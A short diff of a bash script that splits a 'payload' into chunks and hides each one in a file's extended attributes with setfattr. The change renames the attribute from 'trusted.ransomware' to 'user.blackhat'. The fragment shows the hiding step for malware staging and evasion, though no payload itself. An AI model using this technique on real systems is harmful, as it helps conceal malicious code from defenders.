@@ -59,7 +59,7 @@ for idx in "${!CHUNKS[@]}"; do
   CHUNK_VAL="${CHUNKS[$idx]}"
   TARGET_FILE="${FILES[$idx]}"
   echo "[*] Writing part $((idx + 1)) to $TARGET_FILE"
-  setfattr -n trusted.ransomware -v "$CHUNK_VAL" "$TARGET_FILE"
+  setfattr -n user.blackhat -v "$CHUNK_VAL" "$TARGET_FILE"
 done
 
 echo "[+] Done! Payload divided across 4 files matching '$PATTERN' in $TARGET_DIR."
